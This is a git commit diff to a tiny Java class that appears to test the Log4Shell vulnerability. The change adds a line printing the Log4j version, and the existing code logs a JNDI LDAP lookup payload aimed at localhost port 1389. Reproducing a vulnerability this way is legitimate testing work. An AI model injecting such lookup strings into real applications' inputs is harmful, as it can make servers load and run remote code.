31c6ce044beb05953d6bfa49b11c4a57116cc7ae
nyamakawa <nyamakawa2@gmail.com>
2021-12-10 22:36:04 +0900

    Write log4j version

--- src/main/java/log4j.java
+++ src/main/java/log4j.java
@@ -6,6 +6,7 @@ public class log4j {
     private static final Logger logger = LogManager.getLogger(log4j.class);
 
     public static void main(String[] args) {
+        logger.error(LogManager.class.getPackage().getImplementationVersion());
         logger.error("${jndi:ldap://127.0.0.1:1389/a}");
     }
 }
